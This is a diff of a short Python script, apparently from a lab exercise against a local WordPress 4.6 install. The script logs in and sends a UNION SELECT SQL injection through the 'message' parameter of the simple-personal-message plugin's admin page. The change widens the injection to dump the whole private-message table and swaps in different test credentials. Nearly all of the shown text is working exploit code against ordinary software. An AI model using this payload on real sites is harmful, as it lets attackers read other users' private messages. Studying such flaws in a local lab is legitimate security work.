@@ -12,15 +12,15 @@ print "\n" + ("# " + browser.title() + "\n")
 
 browser.select_form("loginform")
 
-browser.form['log'] = 'freh'
-browser.form['pwd'] = 'fratello'
+browser.form['log'] = 'marc98'
+browser.form['pwd'] = 'marco'
 browser.submit()
 
 #printing the title of the page to show my steps
 print "\n" + ("# " + browser.title() + "\n")
 
 #opening a page injecting the malicious sql code with a specific ID to see a specific messagge
-response = browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%20*%20FROM%20wp_spm_message%20WHERE%20id=1")
+response = browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%20*%20FROM%20wp_spm_message")
 
 page = browser.response().read()
 
